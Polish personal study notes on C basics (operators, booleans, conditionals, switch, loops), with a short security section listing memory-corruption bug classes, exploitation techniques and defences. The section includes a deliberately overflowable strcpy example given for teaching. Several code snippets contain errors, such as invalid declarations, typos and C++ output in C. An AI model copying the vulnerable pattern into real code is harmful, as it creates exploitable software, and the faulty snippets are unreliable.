
Przykład
Lubię to:

```
const int minutesPerHour = 60;
```
To jednak nie zadziała :

```
const int minutesPerHour;
minutesPerHour = 60; // error
```

Dobra praktyka
Inną rzeczą związaną ze stałymi zmiennymi jest to, że dobrą praktyką jest deklarowanie ich wielkimi literami. Nie jest to wymagane, ale przydatne dla czytelności kodu i wspólne dla programistów C:

const int GOOD = 10;

## Operators
Operatory służą do wykonywania operacji na zmiennych i wartościach.

W poniższym przykładzie używamy + operatora , aby dodać dwie wartości:

int myNum = 100 + 50;

Chociaż +operator jest często używany do dodawania dwóch wartości, jak w powyższym przykładzie, może być również używany do dodawania zmiennej i wartości lub zmiennej i innej zmiennej:

int sum1 = 100 + 50;
int sum2 = sum1 + 250; // 150 + 250 = 400
int sum3 = sum2 + sum2; // = 400 + 400 = 800

C dzieli operatorów na następujące grupy:

Operatory arytmetyczne
Operatory przypisania
Operatory porównania
Operatory logiczne
Operatory bitowe

Operatory arytmetyczne
Operatory arytmetyczne służą do wykonywania typowych operacji matematycznych.

czyli: +, -, /, *, ++, --, %

% Moduł Zwraca resztę z dzielenia x % y
++ Increment Zwiększa wartość zmiennej o 1 ++x
-- Decrement Zmniejsza wartość zmiennej o 1 --x

Operatory przypisania
Operatory przypisania służą do przypisywania wartości do zmiennych.

dodanie wartości np. do istniejącej 
int x = 10;
int x += 5;

![c392cbd88107bb6f6c4c40cfe40261e5.png](:/f33264226a694a4286b82b721dd7a1ac)

Operatory porównania
Operatory porównania służą do porównywania dwóch wartości (lub zmiennych). Jest to ważne w programowaniu, ponieważ pomaga nam znaleźć odpowiedzi i podejmować decyzje.

Wartością zwracaną przez porównanie jest albo 1albo 0, co oznacza prawdę ( 1) lub fałsz ( 0). Te wartości są znane jako wartości logiczne i dowiesz się o nich więcej w rozdziale Boolean i If..Else .

W poniższym przykładzie używamy operatora większego niż ( >), aby dowiedzieć się, czy 5 jest większe niż 3:

int x = 5;
int y = 3;

printf("%i", x > y); // wynik bedzie 1 (prawda) ponieważ 5 jest lepsze niż 3

![fcd13c467d5d9541aa177810a9544091.png](:/1bf2707b5cb1485e91f1a55bc895e4ad)

Operatory logiczne
Za pomocą operatorów logicznych można również testować wartości prawda lub fałsz.

Operatory logiczne służą do określenia logiki między zmiennymi lub wartościami:
![daea3999f9c92ec315b67c044d2655ac.png](:/c4753c93c21d46dfb33f4c8388a157bf)

Rozmiar operatora
Rozmiar pamięci (w bajtach) typu danych lub zmiennej można znaleźć za pomocą operatora sizeof:

#include <stdio.h>

int main(){
 int myint;
 float myfloat;
 char mychar;
 double mydouble;
 
 printf("%lu\n", sizeof(myint)); // wyniki: 4 bajty
 printf("%lu\n", sizeof(myfloat)); // 4 bajty
 printf("%lu\n", sizeof(mychar)); // 1 bajt
 printf("%lu\n", sizeof(mydouble)); // 8 bajtów
 return 0;
}

**Zauważ, że do wydrukowania wyniku używamy %luspecyfikatora formatu zamiast %d. Dzieje się tak dlatego, że kompilator oczekuje, że operator sizeof zwróci znak long unsigned int( %lu), zamiast int( %d). Na niektórych komputerach może działać %d, ale jest bezpieczniejszy w użyciu %lu.**

## Logiczne
Bardzo często w programowaniu będziesz potrzebować typu danych, który może mieć tylko jedną z dwóch wartości, na przykład:

TAK NIE
WŁ. / WYŁ
PRAWDA FAŁSZ
W tym celu C ma booltyp danych, który jest znany jako booleans .

Logiczne reprezentują wartości, które są albo truealbo false.

## Zmienne logiczne
W C booltyp nie jest wbudowanym typem danych, takim jak intlub char.

Został wprowadzony w C99 i aby go użyć, należy zaimportować następujący plik nagłówkowy:

`#include <stdbool.h>`

Zmienna logiczna jest deklarowana za pomocą boolsłowa kluczowego i może przyjmować tylko wartości truelub false:

bool ishackingfunny = false;
bool ishackinggood = true;

Zanim spróbujesz wydrukować zmienne logiczne, powinieneś wiedzieć, że wartości logiczne są zwracane jako liczby całkowite:

1(lub dowolna inna liczba, która nie jest 0) reprezentujetrue
0reprezentujefalse
Dlatego musisz użyć %d specyfikatora formatu, aby wydrukować wartość logiczną:

```
#include <stdio.h>
#include <stdbool.h>

int main(){
bool ishackingfunny = false;
bool ishackinggood = true;

printf("%d\n", ishackingfunny); // odp 0
printf("%d", ishackinggood);  // odp 1
return 0;
}
```
0 = Fałsz
jaka kolwiek liczba powyzej 0 = Prawda

**Jednak bardziej powszechne jest zwracanie wartości logicznej przez porównywanie wartości i zmiennych.**

## Porównanie wartości i zmiennych
Porównywanie wartości jest przydatne w programowaniu, ponieważ pomaga nam znaleźć odpowiedzi i podejmować decyzje.

Na przykład możesz użyć operatora porównania , takiego jak operator większy niż ( >), aby porównać dwie wartości:

printf("%d", 10 > 9); // Wynik będzie 1 (Prawda) Bo 10 jest większy niż 9.

W poniższym przykładzie używamy operatora równości ( ==) do porównywania różnych wartości:

```
printf("%d", 10 == 10); // wynik będzie 1 (True) bo 10 i 10 jest equal
printf("%d", 5 == 55); // False bo 5 jest mniejsze
printf("%d", 10 == 15); // False
```

Nie jesteś ograniczony tylko do porównywania liczb. Możesz także porównywać zmienne boolowskie, a nawet specjalne struktury, takie jak tablice

```
bool chamburgerisgood = true;
bool Pizzajestdobra = true

printf("%d", chamburgerisgood == Pizzajestdobra);
```

Przykład z życia wzięty
Pomyślmy o „przykładzie z życia”, w którym musimy dowiedzieć się, czy dana osoba jest wystarczająco dorosła, aby głosować.

W poniższym przykładzie używamy >=operatora porównania, aby dowiedzieć się, czy wiek ( 25) jest większy niż LUB równy limitowi wiekowemu uprawniającemu do głosowania, który jest ustawiony na 18:

int myAge = 20;
int VotingAge = 18;

prntf("%d", myAge >= VotingAge); // odp 1 (prawda) bo 20 jest wieksze niz 18 // czyli jest dozwolone

 Jeszcze lepszym podejściem (ponieważ jesteśmy teraz na fali) byłoby zawinięcie powyższego kodu w instrukcję if...else, abyśmy mogli wykonać różne akcje w zależności od wyniku:
 
 **Przykład**
Dane wyjściowe „Wystarczająco duży, aby głosować!” jeśli myAgejest większe lub równe 18 . W przeciwnym razie wypisz „Niewystarczająco stary, aby głosować.”:

```
#include <stdio.h>

int main(){
int myAge = 14;
int voteAge = 18;

if (myAge >= voteAge){
printf("you are Old enough to Vote!");
} else {
printf("you are not Old enough to Vote");
}
} // Wynik to będzie że nie wystarczająco dorosły bo 14, ale jak zmienie na np. 18 i pwyzej juz wystarczająco dorosły.
```

![7b26bdc3e86a78a86ca413495439a29c.png](:/055b254ef30d43d084f062515f388c43)

## Instrukcja if
Użyj ifinstrukcji, aby określić blok kodu, który ma zostać wykonany, jeśli warunek to true.
np.

```
if (20 > 18) {
printf("20 jest lepsze niz 18!");
}
```

Możemy również testować zmienne:

```
int x = 20;
int y = 18;

if (x > y) {
printf("x jest lepsze niz y");
}
```

W powyższym przykładzie używamy dwóch zmiennych, x i y , aby sprawdzić, czy x jest większe niż y (za pomocą >operatora). Skoro x to 20, a y to 18, i wiemy, że 20 jest większe niż 18, wypisujemy na ekranie, że „x jest większe niż y”.

## Oświadczenie else
Użyj elseinstrukcji, aby określić blok kodu, który ma zostać wykonany, jeśli warunek to false. np.

```
#include <stdio.h>

int main() {

int time = 20;
if (time < 18) {
printf("Good Morning");
} else {
printf("Good evening");
}
return 0;
}
```
W powyższym przykładzie czas (20) jest większy niż 18, więc warunek to false. Z tego powodu przechodzimy do elsestanu i drukujemy na ekranie „Dobry wieczór”. Jeśli czas był krótszy niż 18, program wydrukowałby „Dzień dobry”.

## Instrukcja else if
Użyj else ifinstrukcji, aby określić nowy warunek, jeśli pierwszy warunek to false.
np.

```
#include <stdio.h>

int main(){
int time = 20;
if (time < 10) {
printf("Good morning");
} else if (time < 20) {
printf("good day");
} else {
printf("good evening");
}
return 0;
}
```
W powyższym przykładzie czas (22) jest większy niż 10, więc pierwszym warunkiem jest false. Następnym warunkiem w else ifinstrukcji jest również false, więc przechodzimy do else warunku, ponieważ warunek 1 i warunek 2 są obydwoma false- i wypisujemy na ekranie „Dobry wieczór”.

Jeśli jednak czas wynosiłby 14, nasz program wydrukowałby „Dzień dobry”.

------------------------------------------------------------------------
|_|_|_|_|WIKIPEDIA|_|_|_|_|
------------------------------------------------------
Arrays to tablice
Tablice to specjalne zmienne, które mogą przechowywać więcej niż jedną wartość pod tą samą nazwą zmiennej, zorganizowane za pomocą indeksu. Tablice są definiowane przy użyciu bardzo prostej składni:

**if ... else** – pozwala na wykonanie jednej z dwóch gałęzi kodu na podstawie wartości typu logicznego,
**switch** – wykonuje jeden z wielu bloków kodu na podstawie porównania wartości liczbowej z wyrażeniami w poszczególnych etykietach case.

Druga grupa instrukcji sterujących służy realizacji pętli. Każda z nich jest wykonywana tak długo, jak podany warunek jest prawdziwy. Składają się na nią:

**while** – warunek jest sprawdzany przed każdą iteracją;
**do ... while** – warunek jest sprawdzany po każdej iteracji;
**for** – pozwala na określenie instrukcji, która wykona się przed pierwszą iteracją oraz instrukcji do wywołania po każdym przebiegu pętli.

Ostatnią grupę stanowią instrukcje skoku (Instrukcja skoku – instrukcja w językach programowania, która powoduje przekazanie sterowania w inne miejsce, tzw. skok.) Należą do nich:

**goto** – realizuje skok do etykiety o podanej nazwie, ale nie jest możliwe wyjście z aktualnie wykonywanej funkcji;
**continue** – przerywa wykonywanie bieżącej iteracji pętli i przechodzi do kolejnej;
**break** – przerywa wykonywanie pętli lub instrukcji switch;
**return** – przerywa wykonywanie bieżącej funkcji i opcjonalnie przekazuje wartość do miejsca wywołania.


Preprocesor w języku C pozwala na manipulację kodem źródłowym przed właściwą kompilacją. Wspiera mechanizmy kompilacji warunkowej (dyrektywa #if i jej warianty) oraz dołączania innych plików źródłowych (#include). Odpowiada również za rozwijanie makr (zdefiniowanych przy użyciu #define)

Dzięki dyrektywie #pragma możliwe jest przekazywanie instrukcji specyficznych dla kompilatora.

W trakcie kompilacji, komentarze zastępowane są znakiem spacji

Typ danych określa zbiór wartości, które może przyjąć dany obiekt, jak również dozwolone operacje na nim[57]. Język udostępnia zestaw typów podstawowych oraz mechanizmów konstruowania typów pochodnych[58].

Szczególnym typem danych w C jest typ pusty void, który nie przechowuje żadnej wartości. W związku z tym można wykorzystywać go jedynie w sytuacjach, gdy wartość nie jest wymagana – np. jako lewy argument operatora , lub w charakterze instrukcji. Rzutowanie tego typu na jakikolwiek inny typ, zarówno jawne, jak i niejawne jest niedozwolone[59]. Słowem void oznacza się między innymi funkcje nie zwracające nic

Typy podstawowe
W języku C istnieje kilka bazowych typów danych, które można dookreślać z użyciem odpowiednich słów kluczowych w celu uzyskania odpowiedniego zakresu wartości. Służą do przechowywania liczb całkowitych (char i int) oraz zmiennoprzecinkowych (float i double)[61].

Razem z typem int można stosować kwalifikatory short oraz long. Pozwalają one programiście wykorzystywać typy danych krótsze i dłuższe niż naturalne dla danej architektury. Ponadto nazwę każdego typu, służącego do przechowywania liczb całkowitych, można również poprzedzić słowem signed lub unsigned, aby określić, czy dany obiekt ma być w stanie przechowywać liczby ujemne[62]. Reprezentacja bitowa wartości, które można zapisać zarówno w wariancie signed, jak i unsigned danego typu jest w obu wariantach taka sama[63].

Standard języka C nie ustala w sposób sztywny zakresów wartości, jakie muszą się zmieścić w obiektach poszczególnych typów. Podobnie nie są określone ich rozmiary w bitach lub bajtach[61]. Od implementacji języka wymaga się, by poszczególne typy danych pozwalały na przechowywanie przynajmniej liczb z ustalonego przedziału[32], a w przypadku typu logicznego _Bool – by miał rozmiar wystarczający do zmieszczenia wartości 0 i 1

![54b548cdc6e587799b3760edeb41adb5.png](:/32e1b865bb5e4379be666301671dccb5)
W powyższej tabeli zebrano minimalne wymagania stawiane dostępnym w C typom całkowitoliczbowym. Dodatkowym ograniczeniem, stawianym przez standard jest to, aby kolejne typy miały zakres niemniejszy od poprzednich. Na przykład obiekt typu short nie może być dłuższy niż int, który z kolei musi być niedłuższy od long

Użycie kwalifikatora long jest dopuszczalne również w połączeniu z typem double, choć standard C nie gwarantuje, że uzyskany w ten sposób typ będzie miał większą pojemność niż wyjściowy. Podobnie jak w przypadku liczb całkowitych, dostępne typy zmiennoprzecinkowe również nie mają sztywno określonego zakresu wartości oraz minimalnej dokładności

![9fee6d20a7f5f9648f91b2334a46858c.png](:/15db8fc5ee5540dab46cb8290e489ea0)



------------------------------------------------------------------------
|_|_|_|_|w3schools.com|_|_|_|_|
------------------------------------------------------

## Ternary Operator.
Istnieje również skrót if else, który jest znany jako operator trójskładnikowy , ponieważ składa się z trzech operandów. Można go użyć do zastąpienia wielu linii kodu pojedynczą linią. Jest często używany do zastąpienia prostych instrukcji if else:

czyli zamiast pisać:

```
int time = 18;
if (time < 18) {
printf("Good day");
} else {
printf("good night");
}
```

Mogę napisać
```
int time = 20;
(time < 18) ? printf("Good day") : printf("Good evening");
```

i to się nazywa **operator trójskładnikowy**

## Instrukcja przełączania
Zamiast pisać wieleif..else stwierdzeń, możesz użyć switchstwierdzeń.

Instrukcja switchwybiera jeden z wielu bloków kodu do wykonania:

Tak to działa:

Wyrażenie switchjest oceniane raz
Wartość wyrażenia jest porównywana z wartościami każdego z nichcase
Jeśli występuje dopasowanie, wykonywany jest powiązany blok kodu
Instrukcja breakwychodzi z bloku switch i zatrzymuje wykonanie
Instrukcja defaultjest opcjonalna i określa kod do uruchomienia, jeśli nie ma dopasowania wielkości liter

przykład na podstawie dni tygodnia:

```
#include <stdio.h>

int main() {
int day = 4;

switch (day) {
case 1:
  printf("Poniedziałek");
  break;
   
   case 2:
  printf("Wtorek");
  break;
   
    case 3:
  printf("Sroda");
  break;
  
   case 4:
  printf("Czwartek");
  break;
  
   case 5:
  printf("Piątek");
  break;
  
    case 6:
  printf("Sobota");
  break;
     
	 case 7:
  printf("NIedziela");
  break;
}
return 0;
}
```

## Przerwa Słowo kluczowe
Kiedy C osiąga break słowo kluczowe, wyrywa się z bloku przełącznika.

Spowoduje to zatrzymanie wykonywania większej liczby testów kodu i przypadków w bloku.

Po znalezieniu dopasowania i zakończeniu pracy nadchodzi czas na przerwę. Więcej testów nie jest potrzebne.

**Przerwa może zaoszczędzić dużo czasu wykonania, ponieważ „ignoruje” wykonanie całej reszty kodu w bloku przełącznika.**

## Domyślne słowo kluczowe
Słowo defaultkluczowe określa kod do uruchomienia, jeśli nie ma dopasowania wielkości liter np:

```
#include <stdio.h>

int main(){
int day = 3;

switch (day) {
case 4:
printf("mondey");
break;

case 5:
printf("thusday");
break;

case 6:
printf("Wedneday");
break;
default:
printf("Hello my name is\n  TEST!");
}
return 0;
}
```

## LOOPS
Pętle mogą wykonywać blok kodu, o ile spełniony jest określony warunek.

Pętle są przydatne, ponieważ oszczędzają czas, zmniejszają liczbę błędów i zwiększają czytelność kodu.

Podczas pętli
Pętla whileprzechodzi przez blok kodu tak długo, jak określony warunek to true:

W poniższym przykładzie kod w pętli będzie wykonywany w kółko, dopóki zmienna ( i) będzie mniejsza niż 5:

```
#include <stdio.h>

int main(){

int i = 0;

 while (i < 400000) {
 printf("%d\n", i);
 i++;
 }
 return 0;
 }
```
 
  w tym przykładzie wynik będzie taki: pojawią się liczby od 0 do 399999 po kolei.

## Pętla Do/While
Pętla do/whilejest wariantem pętli while. Ta pętla wykona blok kodu raz, przed sprawdzeniem, czy warunek jest prawdziwy, a następnie będzie powtarzać pętlę, dopóki warunek jest prawdziwy.

Poniższy przykład wykorzystuje do/whilepętlę. Pętla zawsze zostanie wykonana co najmniej raz, nawet jeśli warunek jest fałszywy, ponieważ blok kodu jest wykonywany przed sprawdzeniem warunku:

```
int i = 0;

do {
printf("%d\n", i);
i++;
}
 while (i < 20);
```

## for loops
Kiedy wiesz dokładnie, ile razy chcesz przejść przez blok kodu, użyj pętli forzamiast whilepętli:


Instrukcja 1 jest wykonywana (jeden raz) przed wykonaniem bloku kodu.

Instrukcja 2 definiuje warunek wykonania bloku kodu.

Instrukcja 3 jest wykonywana (za każdym razem) po wykonaniu bloku kodu.

Poniższy przykład wydrukuje liczby od 0 do 4:

```
int i;

for(i = 0; i < 5; i++) {
printf("%d\n", i);
}
```

**Przykład wyjaśniony**
Instrukcja 1 ustawia zmienną przed rozpoczęciem pętli (int i = 0).

Instrukcja 2 definiuje warunek wykonania pętli (i musi być mniejsze niż 5). Jeśli warunek jest prawdziwy, pętla rozpocznie się od nowa, jeśli jest fałszywy, pętla się zakończy.

Instrukcja 3 zwiększa wartość (i++) za każdym razem, gdy wykonywany jest blok kodu w pętli

inny przykład (W tym przykładzie zostaną wydrukowane tylko wartości parzyste z zakresu od 0 do 10):

```
int i;

for (i = 0; i <= 10; i = i + 2) {
printf("%d\n", i);
}
```

## Nested Loops
Możliwe jest również umieszczenie pętli w innej pętli. Nazywa się to pętlą zagnieżdżoną .

„Wewnętrzna pętla” zostanie wykonana jeden raz dla każdej iteracji „zewnętrznej pętli”:


```
#include <stdio.h>
int main() {

int i, j;

for (i = 1; i <= 2; ++i) {
printf("First: %d\n", i);

for (j = 1; j <= 3; ++j) {
printf("Two: %d\n", j);
}
return 0;
}
}
```

------------------------------------------------------------------------------------
|_|_|_|_|Bezpieczenstwo kodu_|_|_|_|
---------------------------------------------------------------

**W przypadku wywiadów dotyczących kodowania C przejrzyj następujące informacje**:

Przepełnienia/niedomiar liczb całkowitych: https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf

Przepełnienie bufora (stos/sterta): https://owasp.org/www-community/attacks/Buffer_overflow_attack

Luki w zabezpieczeniach ciągów formatu: https://owasp.org/www-community/attacks/Format_string_attack

Oprócz luk w zabezpieczeniach możesz spodziewać się, że ankieter zapyta Cię o podstawy wykorzystania. Możesz poczytać na:

1. NOP Sled
2. Return to libc
3. ROP


Na koniec powinieneś przejrzeć środki zaradcze/obrony, aby chronić się przed tymi lukami:
- [ ] ASLR/DEP
- [ ] Stack Canaries
- [ ] Control Flow Integrity

 najlepszą praktyką może być całkowite unikanie tych zakazanych funkcji, widzę wiele projektów, w których niektóre z tych funkcji są używane, ale w bezpiecznych kontekstach. Jeśli podniesiesz czerwoną flagę po prostu za każdym razem, gdy zobaczysz, że jedna z tych funkcji jest w użyciu, możesz mieć zły czas.

Oto kilka przykładów użycia niesławnej strcpyi nieco bezpieczniejszej wersji strncpy:

```
void foo_1(char* bar) {
    char buf[100];
    strcpy(buf, bar);
    puts(buf);
}

char* foo_2(char* bar) {
    char* buf = NULL; 
    buf = malloc(strlen(bar)+1);
    strcpy(buf, bar);
    return buf; // freed later
}

void foo_3(char* bar) {
    char buf[100];
    strncpy(buf, bar, sizeof(buf));
    puts(buf);
}

void foo_4() {
    char buf[100];
    strcpy(buf, "This is just an example.");
    puts(buf);
}
```

Jeśli zrobiłem to poprawnie, te przykłady powinny wyglądać tak:

1. Niebezpieczne (jeśli barjest dłuższe niż 100 bajtów, nastąpi przepełnienie)
2. Bezpieczny (bufor jest tworzony wystarczająco duży)
3. Niebezpieczne (wytwarza niezakończony ciąg, gdy nie ma bajtów zerowych w pierwszych n bajtach bar)
4. Bezpieczny (ciąg jest stały i mniejszy niż rozmiar bufora)

Dodatkowo, chociaż funkcje z rodziny „strn” również mogą pojawić się na liście zakazanych, wiele projektów używa ich również bezpiecznie, wymuszając na końcu bajt zerowy, często za pomocą funkcji opakowującej.

statystyczna analiza kodu:
https://www.perforce.com/products/klocwork



Innym sposobem na zdefiniowanie stałej jest użycie dyrektywy preprocesora #define .

Dyrektywa #define używa makr do definiowania stałych wartości.

Na przykład:

```
#include <stdio.h>

#define PI 3.14

int main() {
  printf("%f", PI);
  return 0;
}
```

Różnica między const i #define polega na tym, że pierwsza używa pamięci do przechowywania, a druga nie.

https://github.com/ctfs/resources/tree/master/topics/binary-exploitation

AI: Najlepsze praktyki dotyczące organizowania kodu i pisania czystych, łatwych w utrzymaniu programów w C

Modularyzuj kod w funkcje oparte na dyskretnych zadaniach. Zachowaj małe funkcje.
Używaj opisowych nazw zmiennych, funkcji i plików. Unikaj skrótów.
Postępuj zgodnie ze spójną konwencją nazewnictwa, taką jak lower_snake_case.
Podziel duże zadania na mniejsze funkcje pomocnicze.
Ogranicz długości funkcji, aby poprawić czytelność.
Używaj spacji, znaków nowej linii i komentarzy swobodnie, aby poprawić czytelność.
Przechowuj powiązany kod zgrupowany w plikach nagłówkowych, źródłowych i testowych.
Zrozumienie różnych bibliotek C i frameworków

Poznaj standardową bibliotekę C, aby poznać podstawowe funkcje, takie jak wejście/wyjście, obsługa ciągów znaków i operacje matematyczne.
Korzystaj z bibliotek takich jak OpenSSL do kryptografii, zlib do kompresji, cURL do transferów internetowych.
Rozważ frameworki takie jak GTK+ do tworzenia graficznych interfejsów użytkownika.
Przeglądaj biblioteki/interfejsy API Linuksa, takie jak wątki POSIX do wielowątkowości.
Techniki zarządzania pamięcią

Użyj malloc()/free() do ręcznego przydzielenia/zwolnienia pamięci. Pamiętaj, aby zwolnić całą przydzieloną pamięć.
Naucz się używać valgrind do sprawdzania kodu pod kątem wycieków pamięci.
Zapoznaj się z inteligentnymi wskaźnikami i metodami puli pamięci, aby zautomatyzować zarządzanie pamięcią.
Zrozumienie alokacji stosu i sterty oraz statycznej i dynamicznej alokacji pamięci.
Optymalizacja wydajności i wydajności kodu

Kod profilu z narzędziami takimi jak gprof do identyfikowania wąskich gardeł.
Unikaj zbędnych alokacji/kopii pamięci dla dużych struktur danych.
Używaj wydajnych algorytmów i struktur danych, takich jak wyszukiwanie binarne, tablice skrótów.
Jeśli to możliwe, przechowuj często używane dane w szybszej pamięci podręcznej.
Skompiluj kod z włączonymi flagami optymalizacji.
Zaawansowane tematy C

Naucz się wielowątkowości z pthreads dla równoległości. Użyj muteksów do synchronizacji.
Zaimplementuj sieć klient/serwer z gniazdami i protokołem TCP/IP.
Używaj funkcji fork() i exec() do sterowania procesami i komunikacji między procesami.
Pisz kod programowania systemu Linux z dostępem niskiego poziomu.
Przejście na inne języki

Nauka języka C ułatwia naukę innych języków, takich jak Python, Java, C#.
Zrozumienie ręcznego zarządzania pamięcią w C pomaga później podczas nauki wyrzucania elementów bezużytecznych.
Znajomość interfejsów API systemu Linux i standardowych bibliotek C pomaga w nauce frameworków w językach wyższego poziomu.
Algorytmy i struktury danych tłumaczą się między językami.

Przyjrzyj się operatorom „zwarcia”: && i ||

• Jednak kompilator może nie przestrzegać ściśle tych zasad, jeśli plik
zachowywać się
• Na przykład, jeśli program nie może określić, czy wyrażenie zostało obliczone, czy nie (tj. 
obliczenie wyrażenia nie wpływa na stan programu – to znaczy wynik nie jest potrzebny i nie 
ma skutków ubocznych), to kompilator nie musi oceniać tego wyrażenia
program nie może określić, czy reguła była przestrzegana, czy nie. Nazywa się to 
zachowaniem „jak gdyby”, ponieważ kompilator zachowuje się tak, jakby wszystkie 
reguły były przestrzegane.

![a8c7fd0801e63f777bfcb6b228a20722.png](:/5f9621f9b3874a32ae22e1bd3b2b1211)
![b13466c6fb449d75dcebd5bd70e4e81b.png](:/ca34a430ddb743a5bbcb6259b949cf45)
![64c21a1278308449b886e6735a031c4a.png](:/6ed5cabdfe624d27b7d3f5a26a3cda89)

1. Operacje arytmetyczne w C
Operatory te są używane do wykonywania operacji arytmetycznych/matematycznych na operandach. Przykłady: (+, -, *, /, %,++,–). Operatory arytmetyczne są dwojakiego rodzaju:

a) Operatorzy jednoargumentowi:
Operatory, które działają lub pracują z pojedynczym operandem, są operatorami jednoargumentowymi. Na przykład: Operatory przyrostu(++) i dekrementu(–)

int val = 5;
cout<<++val;  // 6
b) Operatory binarne:
Operatory, które działają lub pracują z dwoma operandami, są operatorami binarnymi. Na przykład: Dodawanie(+), Odejmowanie(-), mnożenie(*), Dzielenie(/) operatory

int a = 7;
int b = 2;
cout<<a+b; // 9
2. Operatory relacyjne w C
Służą one do porównywania wartości dwóch argumentów. Na przykład sprawdzenie, czy jeden operand jest równy drugiemu operandowi, czy nie, czy operand jest większy od drugiego operandu, czy nie, itp. Niektóre operatory relacyjne to (==, >= , <= (Więcej informacji można znaleźć w tym artykule).

int a = 3;
int b = 5;
cout<<(a < b);
// operator to check if a is smaller than b
3. Operator logiczny w C
Operatory logiczne służą do łączenia dwóch lub więcej warunków/ograniczeń lub do uzupełniania oceny rozważanego warunku pierwotnego. Wynikiem działania operatora logicznego jest wartość logiczna true lub false.

Na przykład operator logiczny AND reprezentowany jako operator "&&" w C zwraca wartość true, gdy oba rozważane warunki są spełnione. W przeciwnym razie zwraca wartość false. Dlatego a & b zwraca wartość true, gdy zarówno a, jak i b są prawdziwe (tj. niezerowe) (zobacz ten artykuł, aby uzyskać więcej informacji).

cout<<((4 != 5) && (4 < 5));     // true
4. Operatory bitowe w C 
Operatory bitowe są używane do wykonywania operacji na poziomie bitów na operandach. Operatory są najpierw konwertowane na poziom bitów, a następnie obliczenia są wykonywane na operandach. Operacje matematyczne, takie jak dodawanie, odejmowanie, mnożenie itp., mogą być wykonywane na poziomie bitowym w celu szybszego przetwarzania. Na przykład operator bitowy AND reprezentowany jako "&" w C przyjmuje dwie liczby jako operandy i wykonuje AND na każdym bitzie dwóch liczb. Wynik operatora AND wynosi 1 tylko wtedy, gdy oba bity mają wartość 1(prawda).

int a = 5, b = 9;   // a = 5(00000101), b = 9(00001001)
cout << (a ^ b);   //  00001100
cout <<(~a);       // 11111010
5. Operatory przydziału w C
Operatory przypisania służą do przypisania wartości zmiennej. Operand po lewej stronie operatora przypisania jest zmienną, a operand po prawej stronie operatora przypisania jest wartością. Wartość po prawej stronie musi być tego samego typu danych, co zmienna po lewej stronie, w przeciwnym razie kompilator zgłosi błąd.

Poniżej przedstawiono różne typy operatorów przypisania:

a) "="
Jest to najprostszy operator przypisania. Ten operator służy do przypisywania wartości po prawej stronie do zmiennej po lewej stronie.
Przykład:

a = 10;
b = 20;
ch = 'y';
b) "+="
Ten operator jest kombinacją operatorów "+" i "=". Ten operator najpierw dodaje bieżącą wartość zmiennej po lewej do wartości po prawej stronie, a następnie przypisuje wynik do zmiennej po lewej stronie.
Przykład:

(a += b) can be written as (a = a + b)
If initially value stored in a is 5. Then (a += 6) = 11.
c) "-=" 
Ten operator jest kombinacją operatorów '-' i '='. Ten operator najpierw odejmuje wartość po prawej od bieżącej wartości zmiennej po lewej stronie, a następnie przypisuje wynik do zmiennej po lewej stronie.
Przykład:

(a -= b) can be written as (a = a - b)
If initially value stored in a is 8. Then (a -= 6) = 2.
d) "*=" 
Ten operator jest kombinacją operatorów "*" i "=". Ten operator najpierw mnoży bieżącą wartość zmiennej po lewej do wartości po prawej, a następnie przypisuje wynik do zmiennej po lewej stronie.
Przykład:

(a *= b) can be written as (a = a * b)
If initially, the value stored in a is 5. Then (a *= 6) = 30.
e) "/="
Ten operator jest kombinacją operatorów "/" i "=". Ten operator najpierw dzieli bieżącą wartość zmiennej po lewej przez wartość po prawej stronie, a następnie przypisuje wynik do zmiennej po lewej stronie.
Przykład:

(a /= b) can be written as (a = a / b)
If initially, the value stored in a is 6. Then (a /= 2) = 3.
6. Inni operatorzy 
Oprócz powyższych operatorów, istnieje kilka innych operatorów dostępnych w języku C służących do wykonywania określonych zadań. Niektóre z nich omówiono tutaj:

I. Wielkość operatora
sizeof jest często używany w języku programowania C.
Jest to operator jednoargumentowy czasu kompilacji, który może być użyty do obliczenia rozmiaru jego operandu.
Wynik sizeof jest typu całki bez znaku, który jest zwykle oznaczany przez size_t.
Zasadniczo rozmiar operatora służy do obliczania rozmiaru zmiennej.
Aby dowiedzieć się więcej na ten temat, zapoznaj się z tym artykułem.

ii. Operator przecinka
Operator przecinka (reprezentowany przez token) jest operatorem binarnym, który oblicza swój pierwszy operand i odrzuca wynik, a następnie oblicza drugi operand i zwraca tę wartość (i typ).
Operator przecinka ma najniższy priorytet spośród wszystkich operatorów języka C.
Przecinek działa zarówno jako operator, jak i separator.
Aby dowiedzieć się więcej na ten temat, zapoznaj się z tym artykułem.

iii. Operator warunkowy
Operator warunkowy ma postać Wyrażenie1? Wyrażenie2: Wyrażenie3
Tutaj Wyrażenie1 jest warunkiem do oceny. Jeśli warunek (Wyrażenie1) jest True, wykonamy i zwrócimy wynik Expression2, w przeciwnym razie, jeśli warunek (Expression1) jest false, wykonamy i zwrócimy wynik Expression3.
Możemy zastąpić użycie if.. Instrukcje else z operatorami warunkowymi.
Aby dowiedzieć się więcej na ten temat, zapoznaj się z tym artykułem.

iv. Operatory kropki (.) i strzałek (->)
Operatory prętów są używane do odwoływania się do poszczególnych członków klas, struktur i związków.
Operator kropki jest stosowany do rzeczywistego obiektu.
Operator strzałki jest używany ze wskaźnikiem do obiektu.
Aby dowiedzieć się więcej o operatorach DOT, zapoznaj się z tym artykułem, a aby dowiedzieć się więcej o operatorach arrow(->), zapoznaj się z tym artykułem.

v. Operator odlewu
Operatory rzutowania konwertują jeden typ danych na inny. Na przykład int(2.2000) zwróci wartość 2.
Rzutowanie to specjalny operator, który wymusza konwersję jednego typu danych na inny.
Najbardziej ogólna rzuta obsługiwana przez większość kompilatorów C jest następująca: − [ wyrażenie (type) ].
Aby dowiedzieć się więcej na ten temat, zapoznaj się z tym artykułem.

vi.  &,* Operator
Operator wskaźnika & zwraca adres zmiennej. Na przykład &a; poda rzeczywisty adres zmiennej.
Operator wskaźnika * jest wskaźnikiem do zmiennej. Na przykład *var; wskaże zmienną var.
Aby dowiedzieć się więcej na ten temat, zapoznaj się z tym artykułem.

Operatory C z przykładem

// C Program to Demonstrate the working concept of
// Operators
```
#include <stdio.h>
 
int main()
{
 
    int a = 10, b = 5;
    // Arithmetic operators
    printf("Following are the Arithmetic operators in C\n");
    printf("The value of a + b is %d\n", a + b);
    printf("The value of a - b is %d\n", a - b);
 
    printf("The value of a * b is %d\n", a * b);
    printf("The value of a / b is %d\n", a / b);
    printf("The value of a % b is %d\n", a % b);
    // First print (a) and then increment it
    // by 1
    printf("The value of a++ is %d\n", a++);
 
    // First print (a+1) and then decrease it
    // by 1
